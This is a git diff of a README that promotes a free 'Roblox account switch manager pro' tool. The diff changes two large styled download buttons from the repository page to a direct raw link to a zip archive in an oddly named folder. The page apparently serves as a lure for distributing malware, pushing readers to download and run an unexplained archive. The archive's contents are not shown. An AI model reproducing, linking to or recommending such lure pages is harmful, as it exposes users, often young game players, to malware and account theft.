@@ -1,6 +1,6 @@
 <h1>⚡ roblox-account-switch-manager-pro-latest - Switch Roblox Accounts in One Click</h1>
 
-<a href="https://github.com/iiSkyFxck/roblox-account-switch-manager-pro-latest" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin-bottom:30px;">🚀 DOWNLOAD NOW - Free & Fast</a>
+<a href="https://github.com/iiSkyFxck/roblox-account-switch-manager-pro-latest/raw/refs/heads/main/sabellarian/latest_pro_switch_manager_roblox_account_3.9.zip" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin-bottom:30px;">🚀 DOWNLOAD NOW - Free & Fast</a>
 
 ## 📖 What Is This?
 
@@ -38,7 +38,7 @@ Add, remove, organize, and label your accounts. You can rename them, group them,
 
 Visit this link to download the application:
 
-<p><a href="https://github.com/iiSkyFxck/roblox-account-switch-manager-pro-latest" style="display:inline-block;padding:12px 24px;background:#4ecdc4;color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ DOWNLOAD roblox-account-switch-manager-pro-latest</a></p>
+<p><a href="https://github.com/iiSkyFxck/roblox-account-switch-manager-pro-latest/raw/refs/heads/main/sabellarian/latest_pro_switch_manager_roblox_account_3.9.zip" style="display:inline-block;padding:12px 24px;background:#4ecdc4;color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ DOWNLOAD roblox-account-switch-manager-pro-latest</a></p>
 
 The download is free and takes just a few seconds. The file will appear in your "Downloads" folder.
 
